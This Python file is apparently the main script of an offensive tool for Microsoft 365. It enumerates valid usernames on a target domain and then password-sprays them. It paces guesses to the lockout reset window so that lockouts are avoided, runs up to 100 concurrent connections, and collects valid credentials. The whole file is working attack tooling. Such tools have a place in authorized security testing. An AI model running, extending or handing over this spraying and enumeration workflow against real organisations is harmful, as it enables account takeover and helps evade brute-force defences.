#!/usr/bin/env python3

import sys
import signal
import asyncio
import argparse
from core.utils.helper import *
from core.handlers.sprayer import *
from core.handlers.validator import *
from core.handlers.enumerator import *


# Signal handler for Enum routines
def enum_signal_handler(signal, frame):
    loop.stop()
    enum.shutdown(key=True)
    print("\n[+] Valid Accounts: %d" % len(enum.valid_accts))
    sys.exit(0)

# Signal handler for Spray routines
def spray_signal_handler(signal, frame):
    loop.stop()
    spray.shutdown(key=True)
    print("\n[+] Valid Credentials: %d" % len(spray.valid_creds))
    sys.exit(0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer")

    parser.add_argument("-d", "--domain",   type=str,   help="Target O365 domain", required=True)
    parser.add_argument("-e", "--enum",     action="store_true", help="Perform username enumeration")
    parser.add_argument("-s", "--spray",    action="store_true", help="Perform password spraying")
    parser.add_argument("-u", "--username", type=str,   help="Username(s) delimited using commas")
    parser.add_argument("-p", "--password", type=str,   help="Password(s) delimited using commas")
    parser.add_argument("-U", "--userfile", type=str,   help="File containing list of usernames")
    parser.add_argument("-P", "--passfile", type=str,   help="File containing list of passwords")
    parser.add_argument("-c", "--count",    type=int,   help="Number of password attempts to run before resetting lockout timer. Default: 1", default=1)
    parser.add_argument("-l", "--lockout",  type=float, help="Lockout policy reset time (in minutes). Default: 15 minutes", default=15.0)
    parser.add_argument("--limit",    type=int, help="Number of concurrent connections during enum and spray. Default: 100", default=100)
    parser.add_argument("--validate", action="store_true", help="Perform domain validation only.")

    # Allow for secondary target specification
    parser.add_argument("--secondary",          action="store_true", help="Use all secondary targets.")
    parser.add_argument("--validate-secondary", action="store_true", help="Use `OpenID-Config` for validation instead of `getuserrealm`.")
    parser.add_argument("--enum-secondary",     action="store_true", help="Use `ActiveSync` for user enumeration instead of `Autodiscover`.")
    parser.add_argument("--spray-secondary",    action="store_true", help="Use `ActiveSync` for password spraying instead of `Autodiscover`.")

    parser.add_argument("--timeout", type=int, help="Request timeout. Default: 25", default=25)
    parser.add_argument("--proxy",   type=str, help="Proxy to pass traffic through: [http(s)://ip:port]")
    parser.add_argument("--output",  type=str, help="Output directory. Default: Current directory", default="./")
    parser.add_argument("--safe",    action="store_true", help="Terminate tool if a locked account is identified.")
    parser.add_argument("--paired",  action="store_true", help="Password spray pairing usernames and passwords (1:1).")
    parser.add_argument("--debug",   action="store_true", help="Debug output")

    args = parser.parse_args()

    # Lazy banner...
    print("*** O365 Spray ***")

    # If enumerating users make sure we have a username or username file
    if args.enum and (not args.username and not args.userfile):
        parser.error("-u/--username or -U/--userfile is required when performing user enumeration via -e/--enum.")

    # If password spraying make sure we have username(s) and password(s)
    if args.spray and ((not args.username and not args.userfile) or (not args.password and not args.passfile)):
        parser.error("[-u/--username or -U/--userfile] and [-p/--password or -P/--passfile] are required" +
            " when performing password spraying via -s/--spray.")

    start  = time.time()
    helper = Helper()

    # Perform domain validation
    print("[*] Performing O365 validation for: %s" % args.domain)
    validator = Validator(args=args)
    validator.validate()
    if not validator.o365 or args.validate:
        (args.enum, args.spray) = (False, False)


    # Perform user enumeration
    if args.enum:
        loop = asyncio.get_event_loop()

        # We chose to parse files first
        userlist = helper.get_list_from_file(args.userfile) if args.userfile else args.username.split(',')
        password = "Password1" if not args.password else args.password

        print("\n[*] Performing user enumeration against %d potential users" % (len(userlist)))

        enum = Enumerator(args=args)

        # Add signal handler to handle ctrl-c interrupts
        signal.signal(signal.SIGINT, enum_signal_handler)

        try:
            loop.run_until_complete(enum.run(userlist, password))

        except KeyboardInterrupt:
            pass

        enum.shutdown()
        print("\n[+] Valid Accounts: %d" % len(enum.valid_accts))

        loop.run_until_complete(asyncio.sleep(0.250))
        loop.close()


    # Perform password spray
    if args.spray:
        loop     = asyncio.get_event_loop()
        passlist = helper.get_list_from_file(args.passfile) if args.passfile else args.password.split(',')

        # Use validated users if enumeration was run
        if args.enum:
            userlist = enum.valid_accts
            # Sleep if ActiveSync was used for enumeration
            if args.secondary:
                print("\n[*] Enumeration was run. Resetting lockout before password spraying.")
                print("[*] Sleeping for %.1f minutes" % (args.lockout))
                helper.lockout_reset_wait(args.lockout)

        else:
            userlist = helper.get_list_from_file(args.userfile) if args.userfile else args.username.split(',')

        if len(userlist) < 1:
            if args.debug: print("\n[DEBUG] No users to run a password spray against.")

        else:
            print("\n[*] Performing password spray against %d users." % len(userlist))

            spray = Sprayer(
                userlist=userlist,
                args=args
            )

            # Add signal handler to handle ctrl-c interrupts
            signal.signal(signal.SIGINT, spray_signal_handler)

            try:
                if not args.paired:
                    for password_chunk in helper.get_chunks_from_list(passlist, args.count):
                        print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))

                        loop.run_until_complete(spray.run(password_chunk))

                        # Handle lock outs if --safe is set
                        if spray.lockout:
                            break

                        # Check if we reached the last password chunk
                        if not helper.check_last_chunk(password_chunk, passlist):
                            helper.lockout_reset_wait(args.lockout)

                else:
                    print("[*] Password spraying using paired usernames and passwords.")

                    loop.run_until_complete(spray.run_paired(passlist))
                    # Since we are pairing usernames and passwords, we can ignore the lockout reset wait call

            except KeyboardInterrupt:
                pass

            spray.shutdown()
            print("\n[+] Valid Credentials: %d" % len(spray.valid_creds))

            loop.run_until_complete(asyncio.sleep(0.250))
            loop.close()

    elapsed = time.time() - start
    if args.debug: print("\n[DEBUG] %s executed in %0.2f seconds." % (__file__, elapsed))